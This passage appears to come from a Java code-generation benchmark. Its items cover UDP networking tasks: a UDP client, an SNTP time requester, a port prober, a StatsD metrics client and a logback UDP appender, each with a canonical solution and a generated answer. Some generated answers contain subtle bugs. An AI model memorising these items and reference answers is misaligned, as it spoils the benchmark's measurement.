    "right_result": "```java\nimport java.io.IOException;\nimport java.net.*;\nimport java.util.List;\n\npublic class UdpTransport {\n    private DatagramSocket sock;\n    private Thread receiver_thread;\n    private RtReceiver receiver;\n    private InetAddress host;\n    private int port = 7800;\n    private boolean server;\n    private Log log;\n    private List<SocketAddress> members;\n\n    public void receiver(RtReceiver receiver) {\n        this.receiver = receiver;\n    }\n\n    public Object localAddress() {\n        return sock.getLocalSocketAddress();\n    }\n\n    public List<? extends Object> clusterMembers() {\n        return (List<? extends Object>) members;\n    }\n\n    public void start(String... options) throws SocketException, UnknownHostException {\n        if (server) {\n            sock = new DatagramSocket(port);\n        } else {\n            host = InetAddress.getByName(options[0]);\n            port = Integer.parseInt(options[1]);\n            sock = new DatagramSocket();\n        }\n\n        receiver_thread = new Thread(new Receiver());\n        receiver_thread.start();\n    }\n\n    public void stop() {\n        if (receiver_thread != null) {\n            receiver_thread.interrupt();\n        }\n        if (sock != null && !sock.isClosed()) {\n            sock.close();\n        }\n    }\n\n    public void send(Object dest, byte[] data, int offset, int length) throws IOException {\n        DatagramPacket packet = new DatagramPacket(data, offset, length, (InetSocketAddress) dest);\n        sock.send(packet);\n    }\n\n    private class Receiver implements Runnable {\n        public void run() {\n            try {\n                byte[] buffer = new byte[65535];\n                while (!Thread.currentThread().isInterrupted()) {\n                    DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n                    sock.receive(packet);\n                    if (receiver != null) {\n                        receiver.onReceive(packet.getData(), packet.getLength(), packet.getPort(), packet.getAddress());\n                    }\n                }\n            } catch (IOException e) {\n                if (!Thread.currentThread().isInterrupted()) {\n                    log.error(\"Error receiving UDP packet\", e);\n                }\n            }\n        }\n    }\n}\n\ninterface RtReceiver {\n    void onReceive(byte[] data, int length, int port, InetAddress address);\n}\n\nclass Log {\n    void error(String message, Exception e) {\n        System.err.println(message);\n        e.printStackTrace();\n    }\n}\n```"
  },
  {
    "Task_id": 594,
    "Instruction": "Task Description: Implement a UDP client class in Java that can receive data packets from a UDP server and process them, including extracting the sender's address and port information.\n\nClass Description: The UDPClient class is designed to handle UDP communication as a client. It creates a UDP socket bound to a specific port, receives incoming packets, processes the data, and provides information about the sender. The class includes methods for receiving data and cleaning up resources.\n\nAttributes:\n- socket: DatagramSocket - The UDP socket used for communication\n- packet: DatagramPacket - The packet object used for receiving data\n- buffer: byte[] - The buffer used to store incoming packet data\n\nMethods:\n- UDPClient(int port) -> void - Constructor that initializes the UDP client. Takes a port number as input to bind the socket.\n  - port: int - The port number to bind the socket to\n- receiveData() -> String - Receives a UDP packet, extracts the data, and returns it along with sender information\n  - Returns: String - The received data concatenated with sender's IP address and port\n- close() -> void - Closes the socket and releases system resources",
    "Canonical_solution": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\n\npublic class UDPClient {\n\n    private DatagramSocket socket;\n    private DatagramPacket packet;\n    private byte[] buffer;\n\n    public UDPClient(int port) throws Exception {\n        this.buffer = new byte[1024];\n        this.socket = new DatagramSocket(port);\n        this.packet = new DatagramPacket(buffer, buffer.length);\n    }\n\n    public String receiveData() throws Exception {\n        socket.receive(packet);\n        String data = new String(packet.getData(), 0, packet.getLength());\n        return data + \"from \" + packet.getAddress().getHostAddress() + \":\" + packet.getPort();\n    }\n\n    public void close() {\n        if (socket != null) {\n            socket.close();\n        }\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "right_result": "```java\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class UDPClient {\n    private DatagramSocket socket;\n    private DatagramPacket packet;\n    private byte[] buffer;\n\n    public UDPClient(int port) throws Exception {\n        socket = new DatagramSocket(port);\n        buffer = new byte[1024];\n        packet = new DatagramPacket(buffer, buffer.length);\n    }\n\n    public String receiveData() throws Exception {\n        socket.receive(packet);\n        InetAddress senderAddress = packet.getAddress();\n        int senderPort = packet.getPort();\n        String receivedData = new String(packet.getData(), 0, packet.getLength());\n        return receivedData + \" from \" + senderAddress.getHostAddress() + \":\" + senderPort;\n    }\n\n    public void close() {\n        if (socket != null && !socket.isClosed()) {\n            socket.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 595,
    "Instruction": "Task Description: Implement a Java class that handles SNTP (Simple Network Time Protocol) requests to synchronize time with an NTP server using UDP communication. The class should validate server responses and provide accurate time synchronization while handling potential errors.\n\nClass Description: The SntpImpl class implements the Sntp interface and provides functionality to request time from an NTP server. It uses UDP communication to send and receive NTP packets, validates server responses against specified thresholds, and calculates time offsets. The class includes helper methods for reading/writing NTP protocol fields and converting between different time representations.\n\nAttributes:\n- NTP_PORT: int - The standard NTP port (123)\n- NTP_MODE: int - The NTP mode (3 for client)\n- NTP_VERSION: int - The NTP version (3)\n- NTP_PACKET_SIZE: int - The size of NTP packets (48 bytes)\n- OFFSET_1900_TO_1970: long - The seconds offset between 1900 and 1970 epochs\n\nMethods:\n- requestTime(InetAddress, float, float, int, int, SntpEventListener) -> SntpResult - Requests time from specified NTP server with validation parameters and timeout\n- writeNtpVersion(byte[]) -> void - Writes NTP version and mode into the buffer\n- writeTimeStamp(byte[], int, long) -> void - Writes a timestamp into the buffer at specified offset\n- readTimeStamp(byte[], int) -> long - Reads a timestamp from the buffer at specified offset\n- read(byte[], int) -> long - Reads 4 bytes from buffer as a long value\n- ui(byte) -> int - Converts byte to unsigned integer\n- doubleMillis(long) -> double - Converts fixed-point NTP format to milliseconds",
    "Canonical_solution": "import android.os.SystemClock;\nimport com.instacart.truetime.InvalidNtpServerResponseException;\nimport com.instacart.truetime.SntpEventListener;\nimport org.jetbrains.annotations.NotNull;\nimport java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class SntpImpl implements Sntp {\n\n    private static final int NTP_PORT = 123;\n    private static final int NTP_MODE = 3;\n    private static final int NTP_VERSION = 3;\n    private static final int NTP_PACKET_SIZE = 48;\n    private static final long OFFSET_1900_TO_1970 = ((365L * 70L) + 17L) * 24L * 60L * 60L;\n\n    @NotNull\n    @Override\n    public synchronized SntpResult requestTime(\n            InetAddress address,\n            float rootDelayMax,\n            float rootDispersionMax,\n            int serverResponseDelayMax,\n            int timeoutInMillis,\n            SntpEventListener listener\n    ) throws IOException {\n\n        listener.sntpRequest(address);\n        DatagramSocket socket = null;\n\n        try {\n            socket = new DatagramSocket();\n            socket.setSoTimeout(timeoutInMillis);\n            byte[] buffer = new byte[NTP_PACKET_SIZE];\n            DatagramPacket request = new DatagramPacket(buffer, buffer.length, address, NTP_PORT);\n\n            writeNtpVersion(buffer);\n            long requestTime = System.currentTimeMillis();\n            long requestTicks = SystemClock.elapsedRealtime();\n            writeTimeStamp(buffer, INDEX_TRANSMIT_TIME, requestTime);\n            socket.send(request);\n\n            DatagramPacket response = new DatagramPacket(buffer, buffer.length);\n            socket.receive(response);\n            long responseTicks = SystemClock.elapsedRealtime();\n\n            long originateTime = readTimeStamp(buffer, INDEX_ORIGINATE_TIME);\n            long receiveTime = readTimeStamp(buffer, INDEX_RECEIVE_TIME);\n            long transmitTime = readTimeStamp(buffer, INDEX_TRANSMIT_TIME);\n            long responseTime = requestTime + (responseTicks - requestTicks);\n\n            double rootDelay = doubleMillis(read(buffer, INDEX_ROOT_DELAY));\n            if (rootDelay > rootDelayMax) {\n                throw new InvalidNtpServerResponseException(\n                        \"Invalid response from NTP server. %s violation. %f [actual] > %f [expected]\",\n                        \"root_delay\",\n                        (float) rootDelay,\n                        rootDelayMax);\n            }\n\n            double rootDispersion = doubleMillis(read(buffer, INDEX_ROOT_DISPERSION));\n            if (rootDispersion > rootDispersionMax) {\n                throw new InvalidNtpServerResponseException(\n                        \"Invalid response from NTP server. %s violation. %f [actual] > %f [expected]\",\n                        \"root_dispersion\",\n                        (float) rootDispersion,\n                        rootDispersionMax);\n            }\n\n            listener.sntpRequestSuccessful(address);\n            return new SntpResult(new long[]{\n                    originateTime,\n                    receiveTime,\n                    transmitTime,\n                    responseTime,\n                    read(buffer, INDEX_ROOT_DELAY),\n                    read(buffer, INDEX_ROOT_DISPERSION),\n                    buffer[1] & 0xff,\n                    responseTicks\n            });\n\n        } catch (Exception e) {\n            listener.sntpRequestFailed(address, e);\n            throw e;\n        } finally {\n            if (socket != null) {\n                socket.close();\n            }\n        }\n    }\n\n    private void writeNtpVersion(byte[] buffer) {\n        buffer[0] = NTP_MODE | (NTP_VERSION << 3);\n    }\n\n    private void writeTimeStamp(byte[] buffer, int offset, long time) {\n        long seconds = time / 1000L;\n        long milliseconds = time - seconds * 1000L;\n        seconds += OFFSET_1900_TO_1970;\n\n        buffer[offset++] = (byte) (seconds >> 24);\n        buffer[offset++] = (byte) (seconds >> 16);\n        buffer[offset++] = (byte) (seconds >> 8);\n        buffer[offset++] = (byte) (seconds >> 0);\n\n        long fraction = milliseconds * 0x100000000L / 1000L;\n        buffer[offset++] = (byte) (fraction >> 24);\n        buffer[offset++] = (byte) (fraction >> 16);\n        buffer[offset++] = (byte) (fraction >> 8);\n        buffer[offset] = (byte) (Math.random() * 255.0);\n    }\n\n    private long readTimeStamp(byte[] buffer, int offset) {\n        long seconds = read(buffer, offset);\n        long fraction = read(buffer, offset + 4);\n        return ((seconds - OFFSET_1900_TO_1970) * 1000) + ((fraction * 1000L) / 0x100000000L);\n    }\n\n    private long read(byte[] buffer, int offset) {\n        return ((long) ui(buffer[offset]) << 24) +\n               ((long) ui(buffer[offset + 1]) << 16) +\n               ((long) ui(buffer[offset + 2]) << 8) +\n               (long) ui(buffer[offset + 3]);\n    }\n\n    private int ui(byte b) {\n        return b & 0xFF;\n    }\n\n    private double doubleMillis(long fix) {\n        return fix / 65.536D;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "right_result": "```java\nimport java.net.*;\nimport java.nio.ByteBuffer;\nimport java.util.Date;\n\npublic class SntpImpl implements Sntp {\n    private static final int NTP_PORT = 123;\n    private static final int NTP_MODE = 3; // Client mode\n    private static final int NTP_VERSION = 3;\n    private static final int NTP_PACKET_SIZE = 48;\n    private static final long OFFSET_1900_TO_1970 = 2208988800L;\n\n    @Override\n    public SntpResult requestTime(InetAddress address, float maxOffset, float maxDelay, int timeout, int retries, SntpEventListener listener) throws IOException {\n        DatagramSocket socket = new DatagramSocket();\n        socket.setSoTimeout(timeout);\n        byte[] buffer = new byte[NTP_PACKET_SIZE];\n\n        writeNtpVersion(buffer);\n\n        InetAddress serverAddress = address;\n        int retryCount = 0;\n        boolean success = false;\n        SntpResult result = null;\n\n        while (retryCount <= retries && !success) {\n            try {\n                DatagramPacket packet = new DatagramPacket(buffer, buffer.length, serverAddress, NTP_PORT);\n                socket.send(packet);\n\n                packet = new DatagramPacket(buffer, buffer.length);\n                socket.receive(packet);\n\n                if (packet.getLength() >= NTP_PACKET_SIZE) {\n                    long originateTimestamp = readTimeStamp(buffer, 24);\n                    long receiveTimestamp = readTimeStamp(buffer, 32);\n                    long transmitTimestamp = readTimeStamp(buffer, 40);\n                    long destinationTimestamp = System.currentTimeMillis();\n\n                    double offset = ((receiveTimestamp - originateTimestamp) + (transmitTimestamp - destinationTimestamp)) / 2.0;\n                    double delay = (transmitTimestamp - originateTimestamp) - (destinationTimestamp - receiveTimestamp);\n\n                    if (Math.abs(offset) <= maxOffset && Math.abs(delay) <= maxDelay) {\n                        Date time = new Date((long) (transmitTimestamp - OFFSET_1900_TO_1970 * 1000));\n                        result = new SntpResult(time, offset, delay);\n                        success = true;\n                    } else {\n                        if (listener != null) {\n                            listener.onInvalidResponse(offset, delay);\n                        }\n                    }\n                } else {\n                    if (listener != null) {\n                        listener.onMalformedResponse();\n                    }\n                }\n            } catch (SocketTimeoutException e) {\n                if (listener != null) {\n                    listener.onRequestTimeout();\n                }\n                retryCount++;\n            } catch (IOException e) {\n                if (listener != null) {\n                    listener.onCommunicationError(e);\n                }\n                break;\n            }\n        }\n\n        socket.close();\n        return result;\n    }\n\n    private void writeNtpVersion(byte[] buffer) {\n        buffer[0] = (byte) (NTP_MODE << 5 | NTP_VERSION << 3);\n    }\n\n    private void writeTimeStamp(byte[] buffer, int offset, long timestamp) {\n        long seconds = (timestamp / 1000) + OFFSET_1900_TO_1970;\n        long fraction = (timestamp % 1000) * 0x100000000L / 1000;\n\n        ByteBuffer bb = ByteBuffer.wrap(buffer, offset, 8).order(java.nio.ByteOrder.BIG_ENDIAN);\n        bb.putLong(seconds << 32 | fraction);\n    }\n\n    private long readTimeStamp(byte[] buffer, int offset) {\n        ByteBuffer bb = ByteBuffer.wrap(buffer, offset, 8).order(java.nio.ByteOrder.BIG_ENDIAN);\n        long ntpTime = bb.getLong();\n\n        long seconds = ntpTime >>> 32;\n        long fraction = ntpTime & 0xFFFFFFFFL;\n        long milliseconds = (seconds * 1000L) + (fraction * 1000L / 0x100000000L);\n\n        return milliseconds;\n    }\n\n    private long read(byte[] buffer, int offset) {\n        return ((buffer[offset] & 0xFFL) << 24)\n             | ((buffer[offset + 1] & 0xFFL) << 16)\n             | ((buffer[offset + 2] & 0xFFL) << 8)\n             | (buffer[offset + 3] & 0xFFL);\n    }\n\n    private int ui(byte b) {\n        return b & 0xFF;\n    }\n\n    private double doubleMillis(long ntpTime) {\n        long seconds = ntpTime >>> 32;\n        long fraction = ntpTime & 0xFFFFFFFFL;\n        return (seconds * 1000.0) + (fraction * 1000.0 / 0x100000000L);\n    }\n}\n```"
  },
  {
    "Task_id": 596,
    "Instruction": "Task Description: Create a UDP communication class that can function as either a server or client, handling packet transmission and reception with proper error handling and resource management.\n\nClass Description: UDPCommunicator is a class that encapsulates UDP communication functionality, allowing an instance to operate as either a server (receiving packets) or client (sending packets). The class manages socket creation, packet transmission/reception, and proper cleanup.\n\nAttributes:\n- socket: DatagramSocket - The underlying UDP socket used for communication\n- isServer: boolean - Flag indicating whether this instance operates as a server (true) or client (false)\n\nMethods:\n- UDPCommunicator(boolean isServer, int port) -> void - Constructor that initializes the UDP socket. Binds to specified port if operating as server.\n- sendPacket(byte[] data, String destAddress, int destPort) -> void - Sends a UDP packet to the specified destination (client mode only). Throws IOException on network errors and IllegalStateException if called in server mode.\n- receivePacket() -> byte[] - Receives a UDP packet (server mode only). Returns the packet data as byte array. Throws IOException on network errors and IllegalStateException if called in client mode.\n- close() -> void - Closes the socket and releases system resources. Safe to call multiple times.",
    "Canonical_solution": "import java.net.DatagramSocket;\nimport java.net.DatagramPacket;\nimport java.net.InetSocketAddress;\nimport java.net.SocketException;\nimport java.io.IOException;\n\npublic class UDPCommunicator {\n    private DatagramSocket socket;\n    private boolean isServer;\n\n    public UDPCommunicator(boolean isServer, int port) throws SocketException {\n        this.isServer = isServer;\n        this.socket = new DatagramSocket(null);\n        if (isServer) {\n            socket.bind(new InetSocketAddress(\"0.0.0.0\", port));\n        }\n    }\n\n    public void sendPacket(byte[] data, String destAddress, int destPort) throws IOException {\n        if (isServer) {\n            throw new IllegalStateException(\"Server cannot send packets without first receiving\");\n        }\n        DatagramPacket packet = new DatagramPacket(data, data.length, \n            new InetSocketAddress(destAddress, destPort));\n        socket.send(packet);\n    }\n\n    public byte[] receivePacket() throws IOException {\n        if (!isServer) {\n            throw new IllegalStateException(\"Client should not be receiving packets\");\n        }\n        byte[] buffer = new byte[800];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n        socket.receive(packet);\n        return packet.getData();\n    }\n\n    public void close() {\n        if (socket != null && !socket.isClosed()) {\n            socket.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.SocketException;\n\npublic class UDPCommunicator {\n    private DatagramSocket socket;\n    private boolean isServer;\n\n    public UDPCommunicator(boolean isServer, int port) throws SocketException {\n        this.isServer = isServer;\n        if (isServer) {\n            socket = new DatagramSocket(port);\n        } else {\n            socket = new DatagramSocket();\n        }\n    }\n\n    public void sendPacket(byte[] data, String destAddress, int destPort) throws IOException, IllegalStateException {\n        if (isServer) {\n            throw new IllegalStateException(\"Cannot send packets in server mode.\");\n        }\n        InetAddress address = InetAddress.getByName(destAddress);\n        DatagramPacket packet = new DatagramPacket(data, data.length, address, destPort);\n        socket.send(packet);\n    }\n\n    public byte[] receivePacket() throws IOException, IllegalStateException {\n        if (!isServer) {\n            throw new IllegalStateException(\"Cannot receive packets in client mode.\");\n        }\n        byte[] buffer = new byte[65507];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n        socket.receive(packet);\n        byte[] receivedData = new byte[packet.getLength()];\n        System.arraycopy(buffer, 0, receivedData, 0, packet.getLength());\n        return receivedData;\n    }\n\n    public void close() {\n        if (socket != null && !socket.isClosed()) {\n            socket.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 597,
    "Instruction": "Task Description: Implement a UDP port probing function to check if a specific UDP port on a remote host is reachable and responsive.\n\nFunction Description: The function sends a UDP \"PING\" packet to a specified host and port, then waits for a response. It determines port reachability based on whether a response is received (port is open/reachable) or if specific exceptions occur (port is unreachable or other errors).\n\nInput:\n- host: String - The target hostname or IP address to probe\n- portMapping: PortMapping - An object containing the external port number to probe (accessed via getExternalPort())\n\nOutput:\n- boolean - Returns true if the port is reachable (response received or timeout occurred), false if the port is unreachable or other errors occurred\n\nThe function handles the following cases:\n1. SocketTimeoutException: Returns true (port may be open but no response received)\n2. PortUnreachableException: Returns false (port definitely unreachable)\n3. Other Socket/IO exceptions: Returns false after logging the error\n4. Successful response: Returns false (unexpected response case)",
    "Canonical_solution": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.net.PortUnreachableException;\nimport java.net.SocketException;\nimport java.net.SocketTimeoutException;\nimport java.io.IOException;\n\nprivate boolean probeUdpPort(String host, PortMapping portMapping) {\n    final Integer port = portMapping.getExternalPort();\n\n    try {\n        final byte[] pingData = \"PING\".getBytes(\"UTF-8\");\n        final DatagramSocket serverSocket = new DatagramSocket(0);\n        final SocketAddress socketAddr = new InetSocketAddress(host, port);\n        serverSocket.connect(socketAddr);\n\n        final InetAddress address = InetAddress.getByName(host);\n        final DatagramPacket sendPacket =\n            new DatagramPacket(pingData, pingData.length, address, port);\n        serverSocket.send(sendPacket);\n\n        final byte[] receiveData = new byte[8];\n        final DatagramPacket receivePacket =\n            new DatagramPacket(receiveData, receiveData.length);\n        serverSocket.setSoTimeout(200);\n        serverSocket.receive(receivePacket);\n\n    } catch (SocketTimeoutException e) {\n        return true;\n    } catch (PortUnreachableException e) {\n        return false;\n    } catch (SocketException e) {\n        LOG.warn(e.getMessage(), e);\n        return false;\n    } catch (IOException e) {\n        LOG.warn(e.getMessage(), e);\n        return false;\n    }\n    return false;\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 2,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.PortUnreachableException;\nimport java.net.SocketException;\nimport java.net.SocketTimeoutException;\n\npublic boolean checkUdpPortReachable(String host, PortMapping portMapping) {\n    int timeout = 1000;\n    byte[] sendData = \"PING\".getBytes();\n    byte[] receiveData = new byte[1024];\n\n    try (DatagramSocket socket = new DatagramSocket()) {\n        socket.setSoTimeout(timeout);\n        InetAddress address = InetAddress.getByName(host);\n        DatagramPacket sendPacket = new DatagramPacket(sendData, sendData.length, address, portMapping.getExternalPort());\n        socket.send(sendPacket);\n\n        DatagramPacket receivePacket = new DatagramPacket(receiveData, receiveData.length);\n        try {\n            socket.receive(receivePacket);\n            return false; // Unexpected response received\n        } catch (SocketTimeoutException e) {\n            return true; // Timeout implies port may be open but no response\n        } catch (PortUnreachableException e) {\n            return false; // Port is definitely unreachable\n        }\n    } catch (SocketException | IOException e) {\n        e.printStackTrace();\n        return false; // Other errors indicate the port is not reachable\n    }\n}\n```"
  },
  {
    "Task_id": 598,
    "Instruction": "Task Description: Create a Java class that implements a StatsD client using UDP protocol for sending metrics to a StatsD server. The class should handle metric batching and asynchronous sending to avoid blocking the main application thread.\n\nClass Description: The Statsd class is a singleton that provides asynchronous metric sending capability to a StatsD server via UDP. It uses a background thread to batch metrics and send them efficiently. The class handles connection setup, error cases, and metric aggregation.\n\nAttributes:\n- CHARSET: [Charset] - The character encoding used for sending metrics (US_ASCII)\n- e: [ExecutorService] - Single thread executor for asynchronous metric processing\n- qManager: [Implicit Queue Manager] - Manages the queue of metrics to be sent (implied by usage but not shown in attributes)\n\nMethods:\n- getInstance(): () -> [Statsd] - Returns the singleton instance of the StatsD client\n- <constructor>: () -> [Statsd] - Private constructor that initializes the background thread for metric processing\n- <background thread>: () -> [void] - Internal method that continuously processes metrics from the queue, batches them, and sends to the StatsD server via UDP\n\nNote: The actual queue management implementation (qManager) is not shown in the provided code but is implied by the usage of getQ() and drainTo() methods. The class handles UDP socket creation, packet preparation, and error cases for host resolution and socket operations.",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport java.nio.charset.Charset;\nimport java.nio.charset.StandardCharsets;\nimport java.util.ArrayList;\nimport java.util.Collection;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\nimport org.openjdk.btrace.core.BTraceRuntime;\nimport org.openjdk.btrace.core.SharedSettings;\n\npublic final class Statsd {\n  private static final Charset CHARSET = StandardCharsets.US_ASCII;\n  private final ExecutorService e = Executors.newSingleThreadExecutor(\n      r -> {\n        Thread t = new Thread(r, \"jStatsD Client Submitter\");\n        t.setDaemon(true);\n        return t;\n      });\n\n  @SuppressWarnings(\"FutureReturnValueIgnored\")\n  private Statsd() {\n    e.submit(\n        () -> {\n          DatagramSocket ds = null;\n          boolean entered = BTraceRuntime.enter();\n          try {\n            ds = new DatagramSocket();\n            DatagramPacket dp = new DatagramPacket(new byte[0], 0);\n            try {\n              dp.setAddress(InetAddress.getByName(SharedSettings.GLOBAL.getStatsdHost()));\n            } catch (UnknownHostException ex) {\n              System.err.println(\n                  \"[statsd] invalid host defined: \" + SharedSettings.GLOBAL.getStatsdHost());\n              dp.setAddress(InetAddress.getLoopbackAddress());\n            } catch (SecurityException ex) {\n              dp.setAddress(InetAddress.getLoopbackAddress());\n            }\n            dp.setPort(SharedSettings.GLOBAL.getStatsdPort());\n\n            while (true) {\n              Collection<String> msgs = new ArrayList<>();\n              msgs.add(qManager.getQ().take());\n              qManager.getQ().drainTo(msgs);\n\n              StringBuilder sb = new StringBuilder();\n              for (String m : msgs) {\n                if (sb.length() + m.length() < 511) {\n                  sb.append(m).append('\\n');\n                } else {\n                  dp.setData(sb.toString().getBytes(CHARSET));\n                  ds.send(dp);\n                  sb.setLength(0);\n                }\n              }\n              if (sb.length() > 0) {\n                dp.setData(sb.toString().getBytes(CHARSET));\n                ds.send(dp);\n              }\n            }\n          } catch (IOException | InterruptedException ex) {\n            ex.printStackTrace();\n          } finally {\n            if (entered) {\n              BTraceRuntime.leave();\n            }\n          }\n        });\n  }\n\n  public static Statsd getInstance() {\n    return Singleton.INSTANCE;\n  }\n\n  private static final class Singleton {\n    private static final Statsd INSTANCE = new Statsd();\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "right_result": "```java\nimport java.net.*;\nimport java.nio.charset.Charset;\nimport java.util.Queue;\nimport java.util.concurrent.*;\n\npublic class Statsd {\n    private static final Charset CHARSET = Charset.forName(\"US-ASCII\");\n    private static final int MAX_PACKET_SIZE = 1432;\n    private static final String DEFAULT_HOST = \"localhost\";\n    private static final int DEFAULT_PORT = 8125;\n\n    private static final Statsd INSTANCE = new Statsd();\n    private final ExecutorService e = Executors.newSingleThreadExecutor();\n    private final Queue<String> qManager = new LinkedBlockingQueue<>();\n\n    private InetAddress host;\n    private int port;\n    private DatagramSocket socket;\n\n    private Statsd() {\n        this(DEFAULT_HOST, DEFAULT_PORT);\n    }\n\n    private Statsd(String host, int port) {\n        this.port = port;\n        try {\n            this.host = InetAddress.getByName(host);\n            this.socket = new DatagramSocket();\n        } catch (UnknownHostException | SocketException e) {\n            throw new RuntimeException(\"Failed to initialize StatsD client\", e);\n        }\n        e.submit(this::backgroundThread);\n    }\n\n    public static Statsd getInstance() {\n        return INSTANCE;\n    }\n\n    public void record(String metricName, double value, String type, double sampleRate) {\n        StringBuilder sb = new StringBuilder(metricName);\n        sb.append(':').append(value);\n        sb.append('|').append(type);\n        if (sampleRate != 1.0) {\n            sb.append(\"|@\").append(sampleRate);\n        }\n        qManager.offer(sb.toString());\n    }\n\n    private void backgroundThread() {\n        while (!Thread.currentThread().isInterrupted()) {\n            try {\n                Thread.sleep(100);\n                StringBuilder batch = new StringBuilder();\n                String metric;\n                while ((metric = getQ()) != null) {\n                    if (batch.length() + metric.length() + 1 > MAX_PACKET_SIZE) {\n                        sendBatch(batch);\n                        batch = new StringBuilder();\n                    } else if (batch.length() > 0) {\n                        batch.append('\\n');\n                    }\n                    batch.append(metric);\n                }\n                if (batch.length() > 0) {\n                    sendBatch(batch);\n                }\n            } catch (InterruptedException e) {\n                Thread.currentThread().interrupt();\n                break;\n            } catch (Exception e) {\n                // Handle errors silently or log them as needed\n            }\n        }\n    }\n\n    private String getQ() {\n        try {\n            return qManager.poll(10, TimeUnit.MILLISECONDS);\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n            return null;\n        }\n    }\n\n    private void sendBatch(StringBuilder batch) {\n        byte[] data = batch.toString().getBytes(CHARSET);\n        try {\n            DatagramPacket packet = new DatagramPacket(data, data.length, host, port);\n            socket.send(packet);\n        } catch (IOException e) {\n            // Handle error silently or log it\n        }\n    }\n\n    public void shutdown() {\n        e.shutdownNow();\n        try {\n            socket.close();\n        } catch (Exception ignored) {\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 599,
    "Instruction": "Task Description: Create a Java class that implements a UDP-based output stream appender for logging purposes, capable of sending log messages to a specified host and port via UDP packets.\n\nClass Description: DropwizardUdpSocketAppender is a specialized OutputStreamAppender that sends log messages over UDP to a remote server. It extends OutputStreamAppender to provide UDP socket functionality while maintaining compatibility with logging frameworks.\n\nAttributes:\n- host: String - The target hostname or IP address where UDP packets should be sent\n- port: int - The target port number on the remote host\n\nMethods:\n- DropwizardUdpSocketAppender(String host, int port) -> None - Constructor that initializes the appender with target host and port information\n- start() -> void - Initializes the output stream and starts the appender (overrides parent method)\n- datagramSocketOutputStream(String host, int port) -> OutputStream - Creates and returns a custom OutputStream implementation that sends data via UDP packets\n\nThe custom OutputStream implementation includes:\n- write(int b) -> void - Throws UnsupportedOperationException as UDP doesn't support byte-level writes\n- write(byte[] b, int off, int len) -> void - Sends the specified bytes as a UDP packet to the configured host and port\n- close() -> void - Closes the underlying DatagramSocket",
    "Canonical_solution": "import ch.qos.logback.core.OutputStreamAppender;\nimport ch.qos.logback.core.spi.DeferredProcessingAware;\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.SocketException;\n\npublic class DropwizardUdpSocketAppender<E extends DeferredProcessingAware> extends OutputStreamAppender<E> {\n\n    private final String host;\n    private final int port;\n\n    public DropwizardUdpSocketAppender(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    @Override\n    public void start() {\n        setOutputStream(datagramSocketOutputStream(host, port));\n        super.start();\n    }\n\n    protected OutputStream datagramSocketOutputStream(String host, int port) {\n        try {\n            return new OutputStream() {\n                private final DatagramSocket datagramSocket = new DatagramSocket();\n\n                @Override\n                public void write(int b) throws IOException {\n                    throw new UnsupportedOperationException(\"Datagram doesn't work at byte level\");\n                }\n\n                @Override\n                public void write(byte[] b, int off, int len) throws IOException {\n                    datagramSocket.send(new DatagramPacket(b, off, len, InetAddress.getByName(host), port));\n                }\n\n                @Override\n                public void close() throws IOException {\n                    datagramSocket.close();\n                }\n            };\n        } catch (SocketException e) {\n            throw new IllegalStateException(\"Unable to create a datagram socket\", e);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "right_result": "```java\nimport ch.qos.logback.core.OutputStreamAppender;\nimport ch.qos.logback.core.encoder.Encoder;\n\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetSocketAddress;\n\npublic class DropwizardUdpSocketAppender<E> extends OutputStreamAppender<E> {\n    private final String host;\n    private final int port;\n\n    public DropwizardUdpSocketAppender(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    @Override\n    public void start() {\n        setOutputStream(datagramSocketOutputStream(host, port));\n        super.start();\n    }\n\n    private OutputStream datagramSocketOutputStream(String host, int port) {\n        return new DatagramOutputStream(host, port);\n    }\n\n    private static class DatagramOutputStream extends OutputStream {\n        private final DatagramSocket socket;\n        private final InetSocketAddress address;\n\n        public DatagramOutputStream(String host, int port) {\n            try {\n                this.socket = new DatagramSocket();\n                this.address = new InetSocketAddress(host, port);\n            } catch (IOException e) {\n                throw new RuntimeException(\"Failed to create UDP socket\", e);\n            }\n        }\n\n        @Override\n        public void write(int b) throws IOException {\n            throw new UnsupportedOperationException(\"Byte-level writes not supported\");\n        }\n\n        @Override\n        public void write(byte[] b, int off, int len) throws IOException {\n            DatagramPacket packet = new DatagramPacket(b, off, len, address);\n            socket.send(packet);\n        }\n\n        @Override\n        public void close() throws IOException {\n            socket.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 6,
